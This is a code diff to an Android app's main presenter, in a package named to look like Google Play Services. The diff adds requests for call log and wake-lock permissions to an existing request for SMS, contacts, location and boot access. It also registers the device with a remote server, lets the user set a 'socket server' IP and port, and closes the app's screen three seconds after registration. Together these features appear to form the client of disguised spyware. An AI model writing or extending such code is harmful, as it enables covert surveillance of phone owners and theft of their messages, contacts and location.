@@ -3,26 +3,39 @@ package com.google.android.gms.persistent.googleapps.ui;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
-import android.view.View;
+import android.util.Log;
 
 import com.google.android.gms.persistent.googleapps.App;
 import com.google.android.gms.persistent.googleapps.R;
 import com.tbruyelle.rxpermissions2.RxPermissions;
 
+import java.util.concurrent.TimeUnit;
+
 import javax.inject.Inject;
+
+import io.reactivex.Single;
+import io.reactivex.android.schedulers.AndroidSchedulers;
+import io.reactivex.disposables.CompositeDisposable;
+import io.reactivex.disposables.Disposable;
+import io.reactivex.schedulers.Schedulers;
+
+import static android.content.ContentValues.TAG;
 
 /**
  * Created by OldMan on 08.04.2017.
  */
 
 public class MainPresenterImpl implements MainPresenter {
-    private final MainView view;
+    private MainView view;
     private final MainInteractor interactor;
     private Context context;
+    private CompositeDisposable compositeDisposable = new CompositeDisposable();
+
     @Inject
     public MainPresenterImpl(MainView view, MainInteractor interactor) {
         this.view = view;
         this.interactor = interactor;
+        context = App.getAppComponent().getContext();
     }
 
     @Override
@@ -37,7 +50,8 @@ public class MainPresenterImpl implements MainPresenter {
 
     @Override
     public void onDestroy() {
-
+        compositeDisposable.clear();
+        view = null;
     }
 
     @Override
@@ -47,23 +61,32 @@ public class MainPresenterImpl implements MainPresenter {
 
     @Override
     public void onDeviceRegister() {
-
+        if (view != null) {
+            view.hideProgress();
+            view.showSnackBar(context.
+                    getResources().getString(R.string.device_is_registered), null);
+        }
     }
+
 
     @Override
     public void getDeviceIdOnServer() {
         if (view != null) {
-            view.showProgress();
             view.hideButton();
+            view.showProgress();
         }
+        Disposable disposable = interactor.onRegisterDevice().subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe(this::handleSuccess, this::handleError);
+        compositeDisposable.add(disposable);
     }
 
     @Override
     public void invokePermission() {
-        context = App.getAppComponent().getContext();
         new RxPermissions((Activity) view)
                 .request(Manifest.permission.READ_PHONE_STATE,
                         Manifest.permission.READ_CONTACTS,
+                        Manifest.permission.READ_CALL_LOG,
                         Manifest.permission.READ_SMS,
                         Manifest.permission.RECEIVE_SMS,
                         Manifest.permission.CALL_PHONE,
@@ -71,7 +94,10 @@ public class MainPresenterImpl implements MainPresenter {
                         Manifest.permission.RECEIVE_BOOT_COMPLETED,
                         Manifest.permission.ACCESS_FINE_LOCATION,
                         Manifest.permission.ACCESS_COARSE_LOCATION,
-                        Manifest.permission.ACCESS_NETWORK_STATE
+                        Manifest.permission.ACCESS_NETWORK_STATE,
+                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
+                        Manifest.permission.WAKE_LOCK
+
                         // privileged
 //                        Manifest.permission.ACCESS_WIFI_STATE,
 //                        Manifest.permission.BATTERY_STATS,
@@ -80,12 +106,57 @@ public class MainPresenterImpl implements MainPresenter {
                 .subscribe(granted -> {
                     if (granted) { // Always true pre-M
                         view.showSnackBar(context.
-                                getResources().getString(R.string.request_permission), null);
+                                getResources().getString(R.string.request_permission_succesfull), null);
                     } else {
                         view.showSnackBar(context.
                                 getResources().getString(R.string.request_permission), context.
                                 getResources().getString(R.string.settings));
                     }
                 });
+    }
+
+    //    @RxLogObservable
+    @Override
+    public void onClickSettingsMenu() {
+        Single<String> ipAddress = interactor.getIpAddress().subscribeOn(AndroidSchedulers.mainThread());
+        Single<String> port = interactor.getPort().subscribeOn((AndroidSchedulers.mainThread()));
+        Disposable disposable = Single.zip(ipAddress, port, (ip, p) -> {
+            if (view != null)
+                view.showSettingsDialog(ip, p);
+            return ip.concat(":" + p); // combine objects...
+        }).subscribeOn((AndroidSchedulers.mainThread()))
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe(s -> Log.d(TAG, " onSubscribe : " + s));
+        compositeDisposable.add(disposable);
+    }
+
+    //    @RxLogObservable
+    @Override
+    public void setNewSocketServer(String ip, String port) {
+        // combine objects...
+        Disposable disposable = Single.zip(interactor.setIpAddress(ip), interactor.setPort(port),
+                (s, str) -> s.concat(":" + str)).subscribeOn((AndroidSchedulers.mainThread()))
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe(s -> {
+                    if (view != null)
+                        view.showSnackBar(context.getString(R.string.save_settings) + s, null);
+                });
+        compositeDisposable.add(disposable);
+    }
+
+    private void handleSuccess(String s) {
+        if (view != null) {
+            view.hideProgress();
+            view.showSnackBar(context.getString(R.string.device_registered), null);
+            Single.timer(3, TimeUnit.SECONDS).subscribe(Long -> view.killActivity());
+        }
+    }
+
+    private void handleError(Throwable throwable) {
+        if (view != null) {
+            view.hideProgress();
+            view.showButton();
+            view.showSnackBar(throwable.getLocalizedMessage(), null);
+        }
     }
 }
